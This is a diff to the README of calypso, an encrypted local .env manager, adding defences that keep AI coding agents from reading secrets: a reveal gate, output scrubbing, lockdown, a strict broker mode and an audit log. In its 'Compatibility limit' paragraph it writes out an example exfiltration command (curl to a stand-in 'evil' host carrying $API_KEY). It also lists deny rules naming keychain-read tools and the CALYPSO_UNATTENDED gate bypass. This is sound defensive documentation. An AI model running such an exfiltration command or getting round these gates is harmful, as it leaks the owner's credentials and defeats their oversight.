@@ -1,7 +1,8 @@
 # calypso
 
 A local, encrypted manager for your projects' `.env` files. One vault holds
-every project's environment. **Nothing ever leaves your machine.**
+every project's environment. Secrets leave the machine only through an
+explicit platform sync or owner-configured trusted operation.
 
 ## Install
 
@@ -81,7 +82,88 @@ calypso get myapp --reveal            # real values (be careful)
 calypso pull myapp                    # write real values
 ```
 
-## LLM Safety (core workflow)
+## Production agent isolation
+
+Use **agent strict mode** when a coding agent must be able to test a real
+credential-backed service without learning either the credential name or
+value. Strict mode does not inject secrets into agent-controlled code.
+
+First, as the owner and outside the agent session, configure a fixed
+operation:
+
+```bash
+calypso operation add-http "staging health" myapp@staging \
+  --url https://staging.example.com/health \
+  --key SERVICE_TOKEN \
+  --header Authorization \
+  --prefix "Bearer " \
+  --expect 200-299
+# Added trusted operation op_<opaque-id> (staging health).
+```
+
+The URL, method, credential binding, header, status range and timeout are
+fixed inside the encrypted vault. Runtime callers cannot replace them or
+provide arbitrary arguments.
+
+Enable the boundary:
+
+```bash
+calypso strict on
+calypso strict status
+```
+
+Enabling strict mode also enables hard lockdown and replaces every readable,
+registered `.env` with a name-free sentinel. Activation refuses if a
+registered file contains unsynced local edits. While strict mode is on,
+owner and compatibility commands—including all forms of `pull`, `get`,
+mutation, import/export, sync and dashboard—are blocked. Turning it off
+requires entering the master passphrase at a real terminal:
+
+```bash
+calypso strict off
+```
+
+For production separation, start the broker under an OS identity that can
+unlock the vault but is not the coding-agent identity:
+
+```bash
+calypso broker serve \
+  --connection-file /run/calypso/myapp-broker.json \
+  --connection-mode 0640 \
+  --allow op_<opaque-id>
+```
+
+Use a dedicated shared group for the broker and agent accounts when selecting
+`0640`; the default is owner-only `0600`. The capability authorizes only the
+fixed operations exposed by that broker and contains no vault credential.
+
+Give the agent only the generated broker capability file and the opaque
+operation ID. The agent needs neither the vault, passphrase nor keychain:
+
+```bash
+calypso broker invoke op_<opaque-id> \
+  --connection-file /run/calypso/myapp-broker.json
+# Operation op_<opaque-id> succeeded (HTTP 204, 183 ms).
+```
+
+Each broker must explicitly allow at least one operation ID; its capability
+cannot invoke other vault operations. The broker binds only to an explicit
+loopback IP, authenticates with a random capability token, disables redirects
+and environment proxies, bounds time and response handling, discards upstream
+headers and bodies, and returns only the opaque ID, success/failure, status
+and duration. A killed broker may leave a stale capability file, but no
+plaintext credential or credential-bearing `.env`; the capability becomes
+unusable when the broker exits.
+
+`calypso operation run <id>` provides the same bounded request directly for
+owner/CI diagnostics. Agents should use `broker invoke` so the vault remains
+outside their OS security domain.
+
+## Compatibility LLM safety
+
+The workflows below prevent common accidental transcript leaks, but they are
+not isolation from an agent that controls the executed command. Use agent
+strict mode and the broker for that threat model.
 
 Prevent AI coding assistants from reading your secrets:
 
@@ -118,6 +200,134 @@ calypso pull myapp -- npm test --verbose
 # 2. Runs `npm test --verbose`
 # 3. Overwrites .env with **** (always, even on failure)
 ```
+
+The command's output is **scrubbed**: any secret value that appears in
+stdout/stderr is replaced with the name-free `<concealed>` marker, so `pull myapp -- env`
+or an error message that echoes a connection string can't leak values
+into an agent transcript. Scrubbing pipes the child's output (colors and
+progress bars degrade). The unsafe `--no-scrub` option requires a human
+terminal and is blocked by lockdown and agent strict mode.
+
+Prefer the disk never seeing plaintext at all? `--inject` skips the
+`.env` write entirely and passes values via the child's process
+environment only:
+
+```bash
+calypso pull myapp --inject -- npm test
+# .env untouched; $API_KEY etc. exist only inside the child process
+```
+
+### The reveal gate
+
+Commands that print or write real values — `get --reveal`,
+`diff --reveal`, `drift --reveal`, plain `pull`, `export`,
+`vault export-project` — require an **interactive terminal**. Headless
+processes (AI agents, scripts) get:
+
+```
+error: get --reveal reveals real values and needs an interactive terminal;
+set CALYPSO_UNATTENDED=1 to allow unattended use (CI)
+```
+
+CI pipelines that legitimately need real values set `CALYPSO_UNATTENDED=1`
+once. Don't give that variable to your coding agent.
+
+### Exposure check — don't leave real values on disk
+
+The easiest leak has nothing to do with calypso commands: a plain
+`pull` for local debugging, then you forget to restore, and the real
+`.env` sits there for anything to read. `exposure` catches it:
+
+```bash
+calypso exposure
+```
+
+```
+myapp@dev  (/home/you/projects/myapp/.env)
+  2 real value(s) on disk for 3h12m: API_KEY, DATABASE_URL
+  fix: calypso pull myapp@dev --safe
+```
+
+A key counts as exposed ("hot") when its on-disk value matches the
+vault's real value — masked, empty, rotated, and tiny values never
+false-positive. Exit code is non-zero when anything has been hot for
+at least `--max-age` (default 30m), so it works as a cron guard:
+
+```bash
+*/15 * * * * calypso exposure --max-age 30m || notify-send "calypso: .env exposed"
+```
+
+`--fix` rewrites hot files with masked values on the spot. If the file
+also holds local edits the vault doesn't know yet, the fix is refused
+(push first, or `--force`).
+
+### Agent config generator
+
+Write secret-safety rules straight into your coding agent's own config:
+
+```bash
+calypso agent init claude-code     # .claude/settings.json deny/allow rules
+calypso agent init opencode        # opencode.json permission.bash deny globs
+calypso agent init codex           # AGENTS.md policy + config.toml snippet
+calypso agent init claude-code --global --dry-run
+```
+
+What each gets:
+
+- **claude-code** — denies inline `CALYPSO_UNATTENDED=...` prefixes (the
+  one bypass of the reveal gate), `calypso export`, `calypso lockdown
+  off`, and direct keychain reads (`secret-tool`, `security
+  find-generic-password`); allowlists the masked commands so they stop
+  prompting.
+- **opencode** — same set as deny globs, plus `calypso*--reveal*`
+  (opencode globs can match mid-command, so `--reveal` is deniable
+  there).
+- **codex** — Codex has no per-command deny, so an advisory policy
+  section is written into `AGENTS.md` (idempotent, marker-delimited) and
+  a `shell_environment_policy` exclude snippet is printed for
+  `~/.codex/config.toml`.
+
+Existing settings are merged, never clobbered; run it again anytime —
+it's idempotent. Agent strict mode is the in-binary boundary; running the
+broker under a separate OS identity keeps the vault and keychain outside
+the agent boundary.
+
+### Lockdown mode
+
+For a hard stop, store the block inside the encrypted vault itself:
+
+```bash
+calypso lockdown on        # reveal-class commands now refuse entirely
+calypso lockdown status
+```
+
+While on, reveal-class commands fail even on a TTY and even with
+`CALYPSO_UNATTENDED=1`. The agent workflow keeps working: `list`, masked
+`get`, `pull --safe`, `pull -- cmd` (scrubbed), `drift`, `gaps`.
+
+Turning it off requires typing the master passphrase at an interactive
+terminal — the keychain and `CALYPSO_PASSPHRASE` are deliberately
+ignored, so an unattended agent cannot flip it back:
+
+```bash
+calypso lockdown off
+# Master passphrase: ************
+```
+
+**Deploy pipelines:** vault-wide lockdown would also block a CI job's
+plain `pull`. For vault copies that feed a deployment, use:
+
+```bash
+calypso lockdown on --allow-unattended
+```
+
+Contexts that explicitly set `CALYPSO_UNATTENDED=1` (your CI) stay
+exempt; everything else — including a headless coding agent — stays
+blocked. Tradeoff: any process willing to set that variable gets
+through, so keep the hard default on the vault your agent can reach,
+and let `calypso agent init` deny `CALYPSO_UNATTENDED=` prefixes at the
+tool layer. For agent-driven production work, use strict broker operations.
+Reserve `pull --inject` for trusted CI commands that are not agent-controlled.
 
 ## Multiple Environments (staging / dev / production)
 
@@ -252,19 +462,37 @@ your workstation.
 
 ### Rotating the passphrase
 
-Calypso doesn't yet ship a built-in re-key command. The manual flow:
-
 ```bash
-calypso export ~/old.enc                  # backup current vault
-calypso keychain forget                   # drop the cached passphrase
-# move ~/.calypso/vault.enc aside, then `calypso init` with the new passphrase
-# import projects from your backup with `calypso import --merge` if needed
-calypso keychain save                     # cache the new passphrase
+calypso vault rekey
+# Master passphrase: ************        (current — keychain/env also work)
+# New master passphrase: ************
+# Confirm new passphrase: ************
 ```
 
-A first-class `calypso vault rekey` is on the roadmap.
+Unattended rotation in CI:
+
+```bash
+CALYPSO_UNATTENDED=1 CALYPSO_NEW_PASSPHRASE="new-pass" calypso vault rekey
+```
+
+After a rekey:
+
+- the old-passphrase blob is kept at `<vault>.pre-rekey.bak` — verify
+  access, then delete it
+- **existing auto-backups and exports still need the OLD passphrase**
+- a stored keychain entry is updated automatically (interactive runs only)
+- update `CALYPSO_PASSPHRASE` wherever CI/workspaces set it
+
+`rekey` is refused while lockdown is on — a process that merely knows
+the old passphrase must not be able to rotate the vault away from you.
 
 ### For AI coding agents (Cursor, Claude Code, Codex, Cline, …)
+
+The production recommendation is the strict broker workflow above: do not
+give the coding-agent OS identity the vault passphrase or keychain. The
+keychain workflow in this section is compatibility mode for trusted agents
+where accidental output disclosure—not hostile or arbitrary code—is the
+threat model.
 
 If you have an AI agent driving a terminal — Cursor's terminal, Claude
 Code, Codex CLI, Cline, Aider, or anything else that shells out — a
@@ -282,7 +510,8 @@ calypso keychain save
 # Passphrase stored in keychain.
 ```
 
-From then on, the agent can run calypso freely:
+From then on, a trusted compatibility-mode agent can run Calypso without
+prompting:
 
 ```bash
 # Agent terminal — these all succeed without any prompt
@@ -314,40 +543,48 @@ Gitpod: under *Variables*. Most cloud agents have an equivalent
 "environment" or "secrets" panel — they get injected into every shell
 the agent opens, so no prompt is ever needed.
 
-#### What can the agent see after this setup?
+#### What can a compatibility-mode agent see?
 
 Once the agent can unlock the vault (via keychain or
-`CALYPSO_PASSPHRASE`), it has **the same access you have**:
+`CALYPSO_PASSPHRASE`), here is what each command gives a **headless**
+process (no TTY, no `CALYPSO_UNATTENDED`):
 
-| Command                          | What the agent sees                                |
-|----------------------------------|----------------------------------------------------|
-| `calypso get myapp KEY`          | Masked, fixed-width (`********`)                    |
-| `calypso get myapp KEY --hint`   | Masked with edge hint (`sk****23`)                 |
-| `calypso get myapp KEY --reveal` | **Real value** (`sk-test-abc123`)                  |
-| `calypso pull myapp`             | Writes **real values** to `.env` on disk           |
-| `calypso pull myapp --safe`      | Writes `****` placeholders                         |
-| `calypso pull myapp -- cmd…`     | Real values during `cmd`, wiped to `****` after    |
+| Command                          | What the agent sees                                 |
+|----------------------------------|-----------------------------------------------------|
+| `calypso get myapp KEY`          | Masked, fixed-width (`********`)                     |
+| `calypso get myapp KEY --hint`   | Masked with edge hint (`sk****23`)                  |
+| `calypso get myapp KEY --reveal` | **Refused** (reveal gate: no TTY)                   |
+| `calypso pull myapp`             | **Refused** (reveal gate: no TTY)                   |
+| `calypso pull myapp --safe`      | Writes `****` placeholders                          |
+| `calypso pull myapp -- cmd…`     | Real values during `cmd`; literal output scrubbed to `<concealed>`; `.env` wiped to `****` after |
+| `calypso pull myapp --inject -- cmd…` | Same, but `.env` never touched — env-only injection |
+| `calypso export` / `export-project`   | **Refused** (reveal gate: no TTY)             |
 
-If you're happy with the agent seeing real values (it needs them to
-run your code anyway), this is fine. If you'd rather it didn't print
-secrets to chat where you might screenshot or paste them, lock it
-down at the tool layer:
+Three in-binary layers keep it that way, strongest last:
 
-- **Cursor / Claude Code / Cline**: use the permission allowlist.
-  Allow `calypso list`, `calypso get` (without `--reveal`), `calypso
-  pull -- cmd…`, `calypso drift`. Disallow `calypso get --reveal`,
-  `calypso pull` (without a trailing `-- cmd`), `calypso export`.
-- **Prompt convention**: tell the agent "use `calypso pull X --safe`
-  whenever you need to show me .env structure" and "use `calypso pull
-  X -- cmd…` to run code that needs real values — never plain `pull`".
-- **Inject, don't write**: `calypso pull myapp -- npm test` injects
-  real values into the subprocess, then immediately overwrites the
-  `.env` with `****` placeholders. The agent's next read of `.env`
-  sees masked values, not real ones.
+1. **Reveal gate** — reveal-class commands need a TTY or
+   `CALYPSO_UNATTENDED=1`. Headless agents hit a hard error.
+2. **Output scrubbing** — `pull -- cmd` filters literal secret values from
+   stdout/stderr with a name-free `<concealed>` marker.
+3. **Lockdown** (`calypso lockdown on`) — the block lives inside the
+   encrypted vault; reveal-class commands refuse regardless of TTY or
+   env vars, and only an interactive passphrase entry lifts it.
 
-The tool-permission allowlist in your agent is the enforcement point —
-calypso happily prints real values when asked, so the discipline of
-*not* asking has to live in the agent's configuration.
+Belt-and-braces additions at the tool layer still help in compatibility mode:
+
+- **Cursor / Claude Code / Cline**: allowlist `calypso list`,
+  `calypso get` (without `--reveal`), `calypso pull -- cmd…`,
+  `calypso drift`; deny `calypso get --reveal`, plain `calypso pull`,
+  `calypso export`, and anything setting `CALYPSO_UNATTENDED`.
+- **Prompt convention**: never use compatibility secret execution for an
+  untrusted agent; enable strict mode and invoke only broker capabilities.
+
+**Compatibility limit:** an agent allowed to run *arbitrary* commands with
+real values injected can still exfiltrate them from inside the child
+process (`pull myapp -- sh -c 'curl evil?$API_KEY'`). Scrubbing hides
+literal values from the transcript, not from the command itself. Agent strict
+mode closes this path by rejecting all arbitrary secret-bearing commands;
+trusted broker operations keep the credential outside agent-controlled code.
 
 ### How it interacts with `CALYPSO_PASSPHRASE`
 
@@ -394,6 +631,66 @@ moves the security boundary, so know what you're trading.
   duration of the job instead.
 - ❌ Machines where you run untrusted code as your user (e.g. a
   freshly cloned repo with build scripts you haven't audited).
+
+## Audit log
+
+Every reveal-class gate decision — permitted **or denied** — and every
+control operation (lockdown, rekey, sync) appends a record to
+`<vault>.audit.log`:
+
+```bash
+calypso audit list
+```
+
+```
+TIME                  OP          SPEC       KEYS  OUTCOME  USER   PARENT  UNATTENDED
+2026-08-02T10:12:03Z  get-reveal  myapp@dev  3     denied   you    node    false
+2026-08-02T10:14:41Z  pull        myapp@dev  3     ok       you    zsh     false
+2026-08-02T10:20:09Z  sync-fly    myapp@prod 5     ok       you    bash    true
+```
+
+Records hold metadata only — never values or passphrases. A denied
+`--reveal` from an agent leaves a trace: the `PARENT` column shows what
+invoked calypso (`node`, `zsh`, a CI runner).
+
+Lines form a SHA-256 hash chain; editing or deleting any line breaks it:
+
+```bash
+calypso audit verify
+# Audit chain OK: 42 event(s) verified.
+```
+
+The log is plaintext (readable without unlocking the vault) and
+best-effort: a failed write warns but never blocks your command. Set
+`CALYPSO_AUDIT=0` to disable. It is evidence against accidents and
+honest processes — an attacker with write access to your files can
+truncate it (they could also read your keychain; same boundary).
+
+## Platform sync (deploy)
+
+Push an env's values straight into a platform's secret store — replaces
+the `get --reveal | ...` shell-pipe dance:
+
+```bash
+calypso sync fly myapp@prod --app myapp-prod     # flyctl secrets import
+calypso sync vercel myapp@prod --target production
+calypso sync k8s myapp@prod --namespace prod     # kubectl apply Secret
+calypso sync k8s myapp@prod --dry-run            # masked preview, no CLI needed
+```
+
+Mechanics: values travel to the platform CLI via **stdin** (never argv,
+never a temp file); k8s gets an in-memory `v1 Secret` manifest with
+base64 data piped to `kubectl apply -f -` (upserts on re-run); vercel
+upserts per key with `env add --force`. The platform CLI's output is
+scrubbed, so a CLI that echoes a value prints `<concealed>`.
+
+`sync` is reveal-class: gated by TTY/`CALYPSO_UNATTENDED=1`, blocked by
+hard lockdown, exempt under `lockdown on --allow-unattended` (fitting —
+sync usually runs in CI), and every run is audited.
+
+Fly note: `secrets import` uses `KEY=VALUE` lines, which can't carry
+multiline values — such keys are rejected by name. Kubernetes carries
+anything via base64.
 
 ## Backup & Transfer
 
@@ -562,10 +859,14 @@ calypso completion fish > ~/.config/fish/completions/calypso.fish
 
 ## CI / Scripts
 
-Set the `CALYPSO_PASSPHRASE` environment variable for non-interactive use:
+Set the `CALYPSO_PASSPHRASE` environment variable for non-interactive use.
+Reveal-class commands (plain `pull`, `get --reveal`, `export`) additionally
+need `CALYPSO_UNATTENDED=1` when there is no terminal — that's the reveal
+gate that keeps headless AI agents from printing real values:
 
 ```bash
 export CALYPSO_PASSPHRASE="my-master-passphrase"
+export CALYPSO_UNATTENDED=1
 calypso set myapp CI_TOKEN=ghp_123
 calypso pull myapp
 ```
@@ -654,10 +955,12 @@ calypso unset <name[@env]> KEY...          # remove variables
 ```bash
 calypso push <name[@env]>                  # import .env → vault (confirms changes)
 calypso push <name[@env]> --force          # skip confirmation
-calypso pull <name[@env]>                  # export vault → .env (real values)
+calypso pull <name[@env]>                  # export vault → .env (real values; reveal-gated)
 calypso pull <name[@env]> --safe           # masked values (****) for LLM safety
 calypso pull <name[@env]> --example        # empty values for .env.example
-calypso pull <name[@env]> -- command...    # --wipe: write, run command, shred
+calypso pull <name[@env]> -- command...    # write, run command (output scrubbed), shred
+calypso pull <name[@env]> --inject -- cmd  # env-only injection, .env never written
+calypso pull <name[@env]> --no-scrub -- c  # unsafe: human TTY only; blocked by lockdown/strict
 ```
 
 ### Analysis
@@ -669,7 +972,51 @@ calypso gaps                                 # find missing keys across all
 calypso drift [project[@env]]                # compare vault vs on-disk .env
 calypso drift [project[@env]] --details      # per-key listing
 calypso drift [project[@env]] --reveal       # show real values in --details
+calypso exposure [project[@env]]             # warn when real values sit on disk
+calypso exposure --max-age 30m               # non-zero exit when hot that long (cron guard)
+calypso exposure --fix [--force]             # rewrite hot .env files with **** values
 calypso dashboard --port <N>                 # web overview
+```
+
+### Agent integration
+
+```bash
+calypso agent init claude-code [--global]    # deny/allow rules → .claude/settings.json
+calypso agent init opencode [--global]       # deny globs → opencode.json
+calypso agent init codex                     # policy section → AGENTS.md (+ toml snippet)
+calypso agent init <tool> --dry-run          # preview without writing
+```
+
+### Agent strict mode and trusted operations
+
+```bash
+calypso operation add-http <label> <spec> --url <https-url> --key <KEY>
+calypso operation list                       # strict: opaque IDs only; owner mode also shows labels
+calypso operation run <operation-id>         # bounded owner/CI diagnostic
+calypso operation remove <operation-id>      # owner operation; blocked when strict
+
+calypso strict on                            # broker-only boundary + hard lockdown
+calypso strict status
+calypso strict off                           # interactive passphrase required
+
+calypso broker serve --connection-file <path> --allow <operation-id>
+calypso broker invoke <operation-id> --connection-file <path>
+```
+
+### Audit
+
+```bash
+calypso audit list [--limit N]               # recent secret-touching operations
+calypso audit verify                         # check the hash chain for tampering
+```
+
+### Platform sync
+
+```bash
+calypso sync fly <spec> [--app A]            # flyctl secrets import (stdin)
+calypso sync vercel <spec> [--target T]      # vercel env add --force, per key
+calypso sync k8s <spec> [--name N] [-n NS]   # kubectl apply of a Secret manifest
+calypso sync <platform> <spec> --dry-run     # masked preview
 ```
 
 ### Vault management
@@ -680,6 +1027,13 @@ calypso init                                 # manual vault creation (optional)
 calypso keychain save                        # store passphrase in OS keychain
 calypso keychain forget                      # remove from keychain
 calypso keychain status                      # check keychain status
+
+calypso lockdown on                          # block reveal-class commands (agent safety)
+calypso lockdown on --allow-unattended       # same, but CALYPSO_UNATTENDED=1 pipelines exempt
+calypso lockdown off                         # lift it (interactive passphrase required)
+calypso lockdown status                      # show lockdown state
+
+calypso vault rekey                          # change the master passphrase (re-encrypts)
 
 calypso export <path>                        # full-vault backup to file
 calypso export --base64                      # full-vault backup to stdout (base64)
@@ -728,7 +1082,17 @@ calypso version                      # print version info
 ### Defaults
 
 - `get` and `diff` **mask** values (first 2 + last 2 chars)
-- `--reveal` required to see real values
+- `--reveal` required to see real values, and only works at an
+  interactive terminal (or with `CALYPSO_UNATTENDED=1` for CI)
+- `calypso lockdown on` disables reveal-class commands entirely until
+  the passphrase is typed at a terminal
+- `calypso strict on` blocks credential names, arbitrary secret-bearing
+  execution and owner mutation; registered `.env` files become name-free
+  sentinels
+- `pull -- cmd` scrubs secret values from the command's output
+  (`<concealed>`)
+- production agents invoke only fixed broker capabilities, with the broker
+  and vault held under a separate OS identity
 - Dashboard binds `127.0.0.1`, shows **no values**
 
 ## `.env` Parsing
@@ -747,7 +1111,8 @@ calypso version                      # print version info
 cmd/calypso/           CLI (Cobra), 20+ commands
 internal/
   crypto/              Argon2id + NaCl secretbox
-  vault/               Encrypted vault + envs + file locking
+  vault/               Encrypted vault + envs + strict-operation policy
+  operation/           Fixed HTTP credential broker executor
   project/             .env parse (multiline), types, serialize
   analysis/            Diff, gaps, key matrix
   dashboard/           Web UI (go:embed template)
